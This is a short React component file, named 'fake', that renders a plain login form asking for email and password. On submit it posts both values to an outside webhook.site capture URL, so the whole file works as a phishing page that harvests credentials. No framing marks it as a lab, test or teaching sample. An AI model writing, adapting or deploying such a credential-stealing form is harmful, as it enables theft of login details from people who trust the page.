import React, { Component } from 'react';
import axios from 'axios';


export default class fake extends Component{


    handlesubmit= e =>{
        e.preventDefault();
        console.log("works");
        const data = {
            e_mail: this.email,
            pass_word: this.password
        };
        console.log(data);
    
        axios.post('https://webhook.site/0fe5b10b-2c60-4885-aab1-d1625df1574c',data)
        .then(response=>{
            console.log(response)
        })
        .catch(error =>{
            console.log(error)
        })
    }
    render(){
        return(
            <form onSubmit={this.handlesubmit}>
                <h3> Login </h3>
                
                <div className="form-group">
                    <label>email</label>
                    <input type="email" className="form-control"
                    onChange={a=> this.email=a.target.value}/>
                </div>
    
                <div className="form-group">
                    <label>password</label>
                    <input type="password" className="form-control"
                    onChange={a=> this.password=a.target.value}/>
                </div>
    
                <br></br>
    
                <button className="btn btn-primary btn-block" type="submit">LOGIN</button>
                
            </form>
        )
    }
}
